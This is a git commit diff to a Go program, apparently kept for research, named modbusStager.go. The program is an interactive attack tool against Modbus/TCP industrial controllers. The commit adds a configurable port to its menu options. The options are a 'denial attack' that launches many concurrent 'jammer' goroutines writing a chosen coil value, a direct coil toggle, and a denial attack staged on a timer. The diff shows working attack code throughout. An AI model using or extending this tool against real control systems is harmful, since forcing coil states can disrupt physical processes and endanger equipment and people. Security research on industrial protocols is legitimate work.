1ab5118a0b317d0701ac6c3ec1e19979caa389d8
Johnathon Beuter <johnathonbeuter@gmail.com>
2024-07-10 11:14:32 -0400

    Port changes fixed

--- Research/Go/modbusStager.go
+++ Research/Go/modbusStager.go
@@ -10,8 +10,8 @@ import (
 
 var wait sync.WaitGroup
 
-func modbusConnection(ip_address string) modbus.Client {
-	target := ip_address + ":502" //Send Modbus traffic the specified IP on the Modbus port
+func modbusConnection(ip_address string, port string) modbus.Client {
+	target := ip_address + ":" + port //Send Modbus traffic the specified IP on the Modbus port
 	handler := modbus.NewTCPClientHandler(target)
 	handler.Timeout = 10 * time.Second
 
@@ -28,12 +28,12 @@ func modbusConnection(ip_address string) modbus.Client {
 	return client
 }
 
-func timeDelay(timeMin int, ip_address string, jamming int, runtime int, coil uint16, coil_val int) {
+func timeDelay(timeMin int, ip_address string, port string, jamming int, runtime int, coil uint16, coil_val int) {
 	timer2 := time.NewTimer(time.Duration(timeMin) * time.Minute)
 	go func() {
 		<-timer2.C
 		fmt.Println("Begining delayed attack...")
-		go denial(ip_address, jamming, runtime, coil, coil_val)
+		go denial(ip_address, port, jamming, runtime, coil, coil_val)
 	}()
 }
 
@@ -63,8 +63,8 @@ func jammer(target modbus.Client, coil uint16, coil_value int, stopChannel chan 
 	}
 }
 
-func denial(ip_address string, jamming int, runtime int, coil uint16, coil_val int) {
-	client := modbusConnection(ip_address)
+func denial(ip_address string, port string, jamming int, runtime int, coil uint16, coil_val int) {
+	client := modbusConnection(ip_address, port)
 	stopChannel := make(chan bool)
 	for i := 0; i < jamming; i++ {
 		wait.Add(1)
@@ -79,19 +79,18 @@ func denial(ip_address string, jamming int, runtime int, coil uint16, coil_val i
 
 	}()
 
-	fmt.Println("I am done!")
 	wait.Wait()
 }
 
-func toggle(ip_address string, coil uint16, coil_value int) {
+func toggle(ip_address string, port string, coil uint16, coil_value int) {
 	if coil_value == 1 {
-		results, err := modbusConnection(ip_address).WriteSingleCoil(coil, 0xFF00) //Writes a one to coil at position 0. 0xFF00 for 1 and 0x0000 for 0
+		results, err := modbusConnection(ip_address, port).WriteSingleCoil(coil, 0xFF00) //Writes a one to coil at position 0. 0xFF00 for 1 and 0x0000 for 0
 		if err != nil {
 			fmt.Println(err)
 			fmt.Println(results)
 		}
 	} else {
-		results, err := modbusConnection(ip_address).WriteSingleCoil(coil, 0x0000)
+		results, err := modbusConnection(ip_address, port).WriteSingleCoil(coil, 0x0000)
 		if err != nil {
 			fmt.Println(err)
 			fmt.Println(results)
@@ -105,7 +104,6 @@ func main() {
 
 	for {
 		var userSelection int
-
 		fmt.Println("Enter: \n 1) For denial attack \n 2) Toggle \n 3) Stage an attack")
 		fmt.Scanln(&userSelection)
 
@@ -113,6 +111,10 @@ func main() {
 			var ip_address string
 			fmt.Println("Enter an ip address")
 			fmt.Scanln(&ip_address)
+
+			var port string
+			fmt.Println("Enter a port (default Modbus port is 502)")
+			fmt.Scanln(&port)
 
 			var jamming int
 			fmt.Println("Enter a number of jammers")
@@ -130,12 +132,16 @@ func main() {
 			fmt.Println("Enter a coil value:")
 			fmt.Scanln(&coil_value)
 
-			go denial(ip_address, jamming, runtime, coil, coil_value)
+			go denial(ip_address, port, jamming, runtime, coil, coil_value)
 			//go denial("192.168.13.86", 500, 1, 0, 0)
 		} else if userSelection == 2 {
 			var ip_address string
 			fmt.Println("Enter an ip address")
 			fmt.Scanln(&ip_address)
+
+			var port string
+			fmt.Println("Enter a port (default Modbus port is 502)")
+			fmt.Scanln(&port)
 
 			var coil uint16
 			fmt.Println("Enter a coil:")
@@ -145,11 +151,15 @@ func main() {
 			fmt.Println("Enter a coil value:")
 			fmt.Scanln(&coil_value)
 
-			go toggle("192.168.13.86", 0, coil_value)
+			go toggle(ip_address, port, coil, coil_value)
 		} else if userSelection == 3 {
 			var ip_address string
 			fmt.Println("Enter an ip address")
 			fmt.Scanln(&ip_address)
+
+			var port string
+			fmt.Println("Enter a port (default Modbus port is 502)")
+			fmt.Scanln(&port)
 
 			var jamming int
 			fmt.Println("Enter a number of jammers")
@@ -171,7 +181,7 @@ func main() {
 			fmt.Println("Enter how many minutes you want to delay your attack before occuring:")
 			fmt.Scanln(&timeMin)
 
-			go timeDelay(timeMin, ip_address, jamming, runtime, coil, coil_value)
+			go timeDelay(timeMin, ip_address, port, jamming, runtime, coil, coil_value)
 		}
 	}
 }
